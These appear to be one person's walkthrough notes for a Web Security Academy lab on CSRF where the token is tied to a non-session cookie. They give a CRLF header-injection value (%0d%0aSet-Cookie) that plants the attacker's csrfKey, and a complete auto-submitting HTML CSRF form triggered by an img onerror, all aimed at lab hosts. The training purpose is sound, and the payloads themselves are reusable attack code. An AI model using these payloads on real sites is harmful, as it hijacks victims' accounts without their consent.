```bash

%0d%0a     (next line: headers)

1. login : 1st wiener user -- 2nd incognito tab for carlos user

wiener  --  victim

2. update the wiener's email while intercepting the request  
3. send to repeater and turn off the intercept  --  wiener
4. both the csrf cookie and token is tied to each other but not with the session id
5. submit a valid csrf token and cookie from another user in wiener  --  carlos user(attacker)   token: bqiL0ALje38VHAL1xEzFe01TrS9MxvtB    csrfKey: lD6bKKUsNi4ezUrZImDSE7qfH1f6r1gH  
6. after changed: send: request --> 302 response: worked

EXPLOIT CONDITION
we need to perform 2 things: 1. Inject a csrfKey in the user's session (HTTP Header Injection)
                             2. Send a CSRF attack to the victim with known CSRF token

7. go to the home page and search a string  --  after we search the string we got the new cookie: LastSearchTerm=apple;  --  carlos user
8. send the request to repeater

9. add new line: headers  --  %0d%0a  && Set-Cookie: csrfKey=lD6bKKUsNi4ezUrZImDSE7qfH1f6r1gH  (attacker)
   ?search=apple%0d%0aSet-Cookie:%20csrfKey=lD6bKKUsNi4ezUrZImDSE7qfH1f6r1gH

10. send the request  --  200 OK RESPONSE

11. generate a CSRF PoC  --  wiener change email request  (  email=wienerFIRSTchange%40mail.com&csrf=bqiL0ALje38VHAL1xEzFe01TrS9MxvtB  )

EXPLAINATION: PAYLOAD  --  update the email value

<!DOCTYPE html>
<html lang="en">
	<body>
		<form method="POST" action="https://lab-id.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="wienerFIRSTchange@mail.com">
			<input type="hidden" name="csrf" value="bqiL0ALje38VHAL1xEzFe01TrS9MxvtB">
			<input type="submit" value="Submit Request">
		</form>
	</body>
</html>


change the value: email  --  wienerCSRFpoc@mail.com
change the value: csrf token: attacker  --  carlos
   		<input type="hidden" name="email" value="wienerCSRFpoc@mail.com">
			<input type="hidden" name="csrf" value="bqiL0ALje38VHAL1xEzFe01TrS9MxvtB">

add a <img src="https://lab-id.web-security-academy.net/?search=apple%0d%0aSet-Cookie:%20csrfKey=lD6bKKUsNi4ezUrZImDSE7qfH1f6r1gH; SameSite=None" onerror="document.forms[0].submit()">
    
    
FINAL PAYLOAD  --  update the email value

<!DOCTYPE html>
<html lang="en">
	<body>
		<form method="POST" action="https://lab-id.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="wienerCSRFpoc1bhb11@mail.com">
			<input type="hidden" name="csrf" value="bqiL0ALje38VHAL1xEzFe01TrS9MxvtB">
			<input type="submit" value="Submit Request">
		</form>
    <img src="https://lab-id.web-security-academy.net/?search=apple%0d%0aSet-Cookie:%20csrfKey=lD6bKKUsNi4ezUrZImDSE7qfH1f6r1gH%3b%20SameSite=None" onerror="document.forms[0].submit()">
	</body>
</html>


POST ANALYSIS
src="payload"  --  https://lab-id.web-security-academy.net/?search=apple Set-Cookie: csrfKey=lD6bKKUsNi4ezUrZImDSE7qfH1f6r1gH; SameSite=None

  
12. press the back button of the browser  --  do not refresh the browser
13. go to the exploit server deliver to the victim and done
14. NOTE if you viewed the exploit then update the email value

```
